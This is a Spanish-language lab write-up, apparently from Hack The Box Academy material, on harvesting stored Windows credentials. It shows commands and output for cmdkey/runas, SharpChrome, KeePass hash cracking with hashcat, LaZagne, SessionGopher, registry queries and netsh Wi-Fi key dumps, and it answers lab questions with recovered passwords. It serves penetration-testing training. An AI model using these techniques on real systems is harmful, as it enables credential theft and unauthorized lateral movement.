
# Otros robos de credenciales en Windows

Existen muchas otras técnicas que podemos utilizar para obtener credenciales en un sistema Windows. Esta sección no cubrirá todos los escenarios posibles, pero analizaremos los más comunes.

***

## <mark style="color:purple;">Credenciales guardadas de Cmdkey</mark>

#### **Listado de credenciales guardadas**

El comando [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) se puede utilizar para crear, enumerar y eliminar nombres de usuario y contraseñas almacenados. Es posible que los usuarios deseen almacenar credenciales para un host específico o utilizarlo para almacenar credenciales para conexiones de servicios de terminal para conectarse a un host remoto mediante Escritorio remoto sin necesidad de ingresar una contraseña. Esto puede ayudarnos a movernos lateralmente a otro sistema con un usuario diferente o a escalar privilegios en el host actual para aprovechar las credenciales almacenadas para otro usuario.

```powershell
C:\htb> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
```

Cuando intentamos conectarnos mediante RDP al host, se utilizarán las credenciales guardadas.

![imagen](https://academy.hackthebox.com/storage/modules/67/cmdkey_rdp.png)

También podemos intentar reutilizar las credenciales `runas` para enviarnos un reverse shell como ese usuario, ejecutar un binario o iniciar una consola PowerShell o CMD con un comando como:

#### **Ejecutar comandos como otro usuario**

```powershell-session
PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

***

## <mark style="color:purple;">Credenciales del navegador</mark>

### **Recuperar credenciales guardadas de Chrome**

Los usuarios suelen almacenar en sus navegadores las credenciales de las aplicaciones que visitan con frecuencia. Podemos utilizar una herramienta como [SharpChrome](https://github.com/GhostPack/SharpDPAPI) para recuperar las cookies y los inicios de sesión guardados de Google Chrome.

```
PS C:\htb> .\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.7.0


[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user



[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0


--- Chrome Credential (Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@inlanefreight.local,Welcome1
```

{% hint style="warning" %}
**Nota**: La recopilación de credenciales de los navegadores basados ​​en Chromium genera eventos adicionales que podrían registrarse e identificarse como `4983`, `4688`, y `16385`, y ser monitoreados por el Blue Team o un SOC.
{% endhint %}

***

## <mark style="color:purple;">Gestores de contraseñas</mark>

Muchas empresas proporcionan administradores de contraseñas a sus usuarios. Esto puede ser en forma de una aplicación de escritorio como `KeePass`, una solución basada en la nube como `1Password`, o una bóveda de contraseñas empresarial como `Thycotic` o `CyberArk`. Obtener acceso a un administrador de contraseñas, especialmente uno utilizado por un miembro del personal de TI o un departamento completo, puede llevar al acceso a nivel de administrador a objetivos de alto valor como dispositivos de red, servidores, bases de datos, etc.&#x20;

Podemos obtener acceso a una bóveda de contraseñas mediante la reutilización de contraseñas o adivinando una contraseña débil/común. Algunos administradores de contraseñas como `KeePass`se almacenan localmente en el host. Si encontramos un archivo `.kdbx` en un servidor, estación de trabajo o recurso compartido de archivos, sabemos que estamos tratando con una base de datos `KeePass` que a menudo está protegida solo por una contraseña maestra. Si podemos descargar un archivo `.kdbx` a nuestro host atacante, podemos usar una herramienta como [keepass2john](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py) para extraer el hash de la contraseña y ejecutarlo a través de una herramienta de descifrado de contraseñas como [Hashcat](https://github.com/hashcat) o [John the Ripper](https://github.com/openwall/john) .

### **Extracción del hash de KeePass**

Primero, extraemos el hash en formato Hashcat usando el script. `keepass2john`, onstalado por defecto

```shell-session
afsh4ck@kali$ keepass2john ILFREIGHT_Help_Desk.kdbx 

ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154
```

### **Cracking de hash sin conexión**

Luego podemos enviar el hash a Hashcat, especificando [el modo hash](https://hashcat.net/wiki/doku.php?id=example_hashes) 13400 para KeePass. Si tenemos éxito, podemos obtener acceso a una gran cantidad de credenciales que se pueden usar para acceder a otras aplicaciones/sistemas o incluso dispositivos de red, servidores, bases de datos, etc., si podemos obtener acceso a una base de datos de contraseñas utilizada por el personal de TI.

```shell-session
afsh4ck@kali$ hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154:panther1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)
Hash.Target......: $keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d...39c154
Time.Started.....: Fri Aug  6 11:17:47 2021 (22 secs)
Time.Estimated...: Fri Aug  6 11:18:09 2021 (0 secs)
Guess.Base.......: File (/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      276 H/s (4.79ms) @ Accel:1024 Loops:16 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:59984-60000
Candidates.#1....: 123456 -> iheartyou

Started: Fri Aug  6 11:17:45 2021
Stopped: Fri Aug  6 11:18:11 2021
```

***

## <mark style="color:purple;">Correo electrónico</mark>

Si obtenemos acceso a un sistema unido a un dominio en el contexto de un usuario de dominio con una bandeja de entrada de Microsoft Exchange, podemos intentar buscar en el correo electrónico del usuario términos como "contraseña", "credenciales", "password", etc. utilizando la herramienta [MailSniper](https://github.com/dafthack/MailSniper) .

***

## <mark style="color:purple;">LaZagne</mark>

Cuando todo lo demás falla, podemos ejecutar la herramienta [LaZagne](https://github.com/AlessandroZ/LaZagne) para intentar recuperar credenciales de una amplia variedad de software. Dicho software incluye navegadores web, clientes de chat, bases de datos, correo electrónico, volcados de memoria, varias herramientas de administración de sistemas y mecanismos de almacenamiento de contraseñas internas (es decir, Autologon, Credman, DPAPI, secretos LSA, etc.). La herramienta se puede utilizar para ejecutar todos los módulos, módulos específicos (como bases de datos) o contra un software en particular (es decir, OpenVPN). El resultado se puede guardar en un archivo de texto estándar o en formato JSON. Vamos a probarlo.

#### **Menú de ayuda de LaZagne**

Podemos ver el menú de ayuda con la flag `-h`:

```powershell-session
PS C:\htb> .\lazagne.exe -h

usage: lazagne.exe [-h] [-version]
                   {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                   ...
				   
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

positional arguments:
  {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                        Choose a main command
    chats               Run chats module
    mails               Run mails module
    all                 Run all modules
    git                 Run git module
    svn                 Run svn module
    windows             Run windows module
    wifi                Run wifi module
    maven               Run maven module
    sysadmin            Run sysadmin module
    browsers            Run browsers module
    games               Run games module
    multimedia          Run multimedia module
    memory              Run memory module
    databases           Run databases module
    php                 Run php module

optional arguments:
  -h, --help            show this help message and exit
  -version              laZagne version
```

#### **Ejecución de todos los módulos de LaZagne**

Como podemos ver, hay muchos módulos disponibles. Al ejecutar la herramienta con la opción `all`, se buscarán aplicaciones compatibles y se devolverán las credenciales de texto sin formato que se encuentren. Como podemos ver en el ejemplo siguiente, muchas aplicaciones no almacenan las credenciales de forma segura (¡es mejor no almacenarlas nunca, punto!). Se pueden recuperar fácilmente y utilizar para escalar privilegios localmente, pasar a otro sistema o acceder a datos confidenciales:

```powershell
PS C:\htb> .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

########## User: jordan ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Credman passwords -----------------

[+] Password found !!!
URL: dev01.dev.inlanefreight.local
Login: jordan_adm
Password: ! Q A Z z a q 1

[+] 2 passwords have been found.

For more information launch it again with the -v option

elapsed time = 5.50499987602
```

***

## <mark style="color:purple;">SessionGopher</mark>

Podemos utilizar [SessionGopher](https://github.com/Arvanaghi/SessionGopher) para extraer credenciales de PuTTY, WinSCP, FileZilla, SuperPuTTY y RDP guardadas. La herramienta está escrita en PowerShell y busca y descifra información de inicio de sesión guardada para herramientas de acceso remoto. Se puede ejecutar de forma local o remota. Busca en la `HKEY_USERS`colmena a todos los usuarios que hayan iniciado sesión en un host unido a un dominio (o independiente) y busca y descifra cualquier información de sesión guardada que pueda encontrar. También se puede ejecutar para buscar archivos de clave privada de PuTTY (.ppk), escritorio remoto (.rdp) y archivos RSA (.sdtid) en las unidades.

### **Ejecutar SessionGopher como usuario actual**

Necesitamos acceso de administrador local para recuperar información de sesión almacenada para cada usuario en `HKEY_USERS`, pero siempre vale la pena ejecutar como nuestro usuario actual para ver si podemos encontrar credenciales útiles.

```powershell
PS C:\htb> Import-Module .\SessionGopher.ps1
 
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
 
          o_
         /  ".   SessionGopher
       ,"  _-"
     ,"   m m
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com
 
[+] Digging on WINLPE-SRV01...
WinSCP Sessions
 
Source   : WINLPE-SRV01\htb-student
Session  : Default%20Settings
Hostname :
Username :
Password :
 
 
PuTTY Sessions
 
Source   : WINLPE-SRV01\htb-student
Session  : nix03
Hostname : nix03.inlanefreight.local

 
SuperPuTTY Sessions
 
Source        : WINLPE-SRV01\htb-student
SessionId     : NIX03
SessionName   : NIX03
Host          : nix03.inlanefreight.local
Username      : srvadmin
ExtraArgs     :
Port          : 22
Putty Session : Default Settings
```

***

## <mark style="color:purple;">Almacenamiento de contraseñas en texto sin formato en el Registro</mark>

Ciertos programas y configuraciones de Windows pueden provocar que se almacenen contraseñas en texto sin formato u otros datos en el registro. Si bien herramientas como `Lazagne`y `SessionGopher`son una excelente manera de extraer credenciales, como evaluadores de penetración también deberíamos estar familiarizados y cómodos con la enumeración manual de las mismas.

### Inicio de sesión automático de Windows

[El inicio de sesión automático](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) de Windows es una función que permite al usuario configurar su sistema operativo Windows para iniciar sesión automáticamente en una cuenta de usuario específica, sin necesidad de introducir manualmente el nombre de usuario y la contraseña cada vez que se inicia el sistema. Sin embargo, una vez configurado, el nombre de usuario y la contraseña se almacenan en el registro, en texto sin formato. Esta función se utiliza habitualmente en sistemas de un solo usuario o en situaciones en las que la comodidad supera la necesidad de una mayor seguridad.

Las claves de registro asociadas con Autologon se pueden encontrar en la siguiente sección en `HKEY_LOCAL_MACHINE` y los usuarios estándar pueden acceder a ellas:

```powershell
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

La configuración típica de una cuenta de Autologon implica la configuración manual de las siguientes claves de registro:

* `AdminAutoLogon`- Determina si el inicio de sesión automático está habilitado o deshabilitado. Un valor de "1" significa que está habilitado.
* `DefaultUserName`- Contiene el valor del nombre de usuario de la cuenta que iniciará sesión automáticamente.
* `DefaultPassword`- Contiene el valor de la contraseña de la cuenta de usuario especificada previamente.

### **Enumeración del inicio de sesión automático con reg.exe**

```powershell
C:\htb> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    <SNIP>
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```

{% hint style="warning" %}
**Nota**: Si es absolutamente necesario configurar Autologon para su sistema Windows, se recomienda utilizar `Autologon.exe` de la suite Sysinternals, que cifrará la contraseña como un  LSA Secret.
{% endhint %}

## <mark style="color:purple;">Putty</mark>

Para las sesiones de Putty que utilizan una conexión proxy, cuando se guarda la sesión, las credenciales se almacenan en el registro en texto sin formato.

```cmd
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

Tenga en cuenta que los controles de acceso para esta clave de registro específica están vinculados a la cuenta de usuario que configuró y guardó la sesión. Por lo tanto, para poder verla, tendríamos que iniciar sesión como ese usuario y buscar en la `HKEY_CURRENT_USER`colmena. Posteriormente, si tuviéramos privilegios de administrador, podríamos encontrarla en la colmena del usuario correspondiente en `HKEY_USERS`.

### **Enumeración de sesiones y búsqueda de credenciales**

Primero, necesitamos enumerar las sesiones guardadas disponibles:

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

A continuación, observamos las claves y valores de la sesión descubierta " `kali%20ssh`":

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log
    
  <SNIP>
  
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!    
```

En este ejemplo, podemos imaginar el escenario en el que el administrador de TI ha configurado Putty para un usuario en su entorno, pero lamentablemente utilizó sus credenciales de administrador en la conexión proxy. La contraseña podría extraerse y potencialmente reutilizarse en la red.

Para obtener información adicional sobre `reg.exe`el registro y cómo trabajar con él, asegúrese de consultar el módulo [Introducción a la línea de comandos de Windows .](https://academy.hackthebox.com/module/167/section/1623)

***

## <mark style="color:purple;">Contraseñas Wifi</mark>

### **Ver redes inalámbricas guardadas**

Si obtenemos acceso de administrador local a la estación de trabajo de un usuario con una tarjeta inalámbrica, podemos enumerar todas las redes inalámbricas a las que se han conectado recientemente.

```powershell
C:\htb> netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
    All User Profile     : Smith Cabin
    All User Profile     : Bob's iPhone
    All User Profile     : EE_Guest
    All User Profile     : EE_Guest 2.4
    All User Profile     : ilfreight_corp
```

### **Recuperar contraseñas inalámbricas guardadas**

Según la configuración de la red, podemos recuperar la clave compartida previamente ( `Key Content` a continuación) y potencialmente acceder a la red de destino. Si bien es poco frecuente, podemos encontrarnos con esto durante una interacción y usar este acceso para saltar a una red inalámbrica separada y obtener acceso a recursos adicionales.

```powershell
C:\htb> netsh wlan show profile ilfreight_corp key=clear

Profile ilfreight_corp on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : ilfreight_corp
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "ilfreight_corp"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : ILFREIGHTWIFI-CORP123908!

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.43.43 (ACADEMY-WINLPE-SRV01)

RDP con el usuario "jordan" y contraseña "HTB_@cademy_j0rdan!"
```

### Herramientas

```powershell
PS C:\tools> ls

    Directory: C:\tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/16/2021   1:37 PM                AccessChk
d-----        3/31/2021   3:05 PM                Mimikatz
d-----        4/16/2021   1:39 PM                PipeList
d-----        3/31/2021   3:27 PM                Procdump
d-----        5/12/2021  11:08 AM                RoguePotato
d-----        3/31/2021   3:11 PM                winPEAS
-a----        3/25/2021   2:57 PM         759176 accesschk64.exe
-a----        4/19/2021   1:57 PM           4554 Enable-Privilege.ps1
-a----        4/19/2021   2:00 PM           3449 EnableAllTokenPrivs.ps1
-a----        5/27/2021   4:36 PM         471840 hhupd.exe
-a----        3/31/2021   3:14 PM          16974 jaws-enum.ps1
-a----        5/12/2021  10:17 AM        3007673 JuicyPotato.exe
-a----        3/31/2021   3:16 PM        6635326 lazagne.exe
-a----        5/12/2021  10:34 AM          38616 nc.exe
-a----        3/31/2021   3:20 PM          13975 PowerDump.ps1
-a----        3/31/2021   3:12 PM         600580 PowerUp.ps1
-a----        5/12/2021  11:58 AM          27136 PrintSpoofer.exe
-a----        3/31/2021   3:07 PM         731136 SafetyKatz.exe
-a----        3/31/2021   3:07 PM         544256 Seatbelt.exe
-a----        3/31/2021   3:15 PM          39492 SessionGopher.ps1
-a----        5/26/2021  11:54 AM         739328 SharpChrome.exe
-a----        3/31/2021   3:07 PM           8704 SharpDump.exe
-a----        3/31/2021   3:07 PM          26112 SharpUp.exe
-a----        3/25/2021   8:22 AM          27136 Watson.exe
```

### Pregunta 1

> Utilizando las técnicas cubiertas en esta sección, recupere la contraseña system admin para la cuenta de usuario `SQL01.inlanefreight.local.`

Vamos a usar Lazagne como primera opción para encontrar contraseñas de usuarios del sistema:

```powershell
PS C:\tools> .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: jordan ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Dbvis passwords -----------------

[+] Password found !!!
Name: SQL01.inlanefreight.local
Driver:
          SQL Server (Microsoft JDBC Driver)

Host: localhost
Login: sa
Password: S3cret_db_p@ssw0rd!
Port: 1433


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 7.92199993134
```

Bingo! Tenemos la contraseña de `SQL01.inlanefreight.local`

### Pregunta 2

```
RDP con el usuario "htb-student" y contraseña "HTB_@cademy_stdnt!"
```

> ¿Qué usuario tiene credenciales almacenadas para el acceso RDP al host WEB01?

```
PS C:\Users\htb-student> cmdkey /list

Currently stored credentials:

    Target: Domain:target=WEB01
    Type: Domain Password
    User: amanda
```

El usuario amanda tiene las credenciales guardadas de cmdkey. Con esto podríamos ejecutar comandos en su nombre sin saber la contraseña en plano

#### **Ejecutar comandos como otro usuario**

```powershell
PS C:\htb> runas /savecred /user:inlanefreight\amanda "comando"
```

{% hint style="warning" %}
En nuestro caso el usuario amanda parece que no es un usuario del sistema, por lo que no podemos hacer gran cosa.
{% endhint %}

```powershell
PS C:\Users\htb-student> net user

User accounts for \\WINLPE-SRV01

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
helpdesk                 htb-student              htb-student_adm
jordan                   logger                   mrb3n
sarah                    sccm_svc                 secsvc
sql_dev
The command completed successfully.
```

### Pregunta 3

> Busque y envíe la contraseña para que el usuario root acceda a `https://vc01.inlanefreight.local/ui/login`

Al inspeccionar las credenciales guardadas en Chrome con SharpChrome.exe encontramos la contraseña:

```powershell
PS C:\tools>  .\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.11.1


[*] Action: Chrome Saved Logins Triage


[*] Triaging Chrome Logins for current user


[*] AES state key file : C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : D72790F4972C4D5700D8D2ED50D21850A3429373534ED938EB009219A51A0479

[X] Error : 0

---  Credential (Path: C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc.inlanefreight.local/,https://vc
.inlanefreight.local/ui/login,5/26/2021 12:09:51 PM,13266529791618996,root,"?U?1`?l}?????A
?"
C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,http://vc01.inlanefreight.local:443/,http:
//vc01.inlanefreight.local:443/login.html,8/7/2021 6:33:01 PM,13272859981246714,root,ILVCadm1n1qazZAQ!


SharpChrome completed in 00:00:00.5067677
```

La máquina no tiene conectividad con internet, por lo que no podemos acceder para comprobar el acceso.

### Pregunta 4

> Enumere el host y busque la contraseña para `ftp.ilfreight.local`

Enumerando el objetivo con SessionGopher encontramos las credenciales:

```powershell
PS C:\tools> Import-Module .\SessionGopher.ps1
PS C:\tools> Invoke-SessionGopher -Target WINLPE-SRV01

          o_
         /  ".   SessionGopher
       ,"  _-"
     ,"   m m
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com

[+] Digging on WINLPE-SRV01...
WinSCP Sessions


Source   : WINLPE-SRV01\htb-student
Session  : Default%20Settings
Hostname :
Username :
Password :

Source   : WINLPE-SRV01\htb-student
Session  : root@ftp.ilfreight.local
Hostname : ftp.ilfreight.local
Username : root
Password : Ftpuser!
```
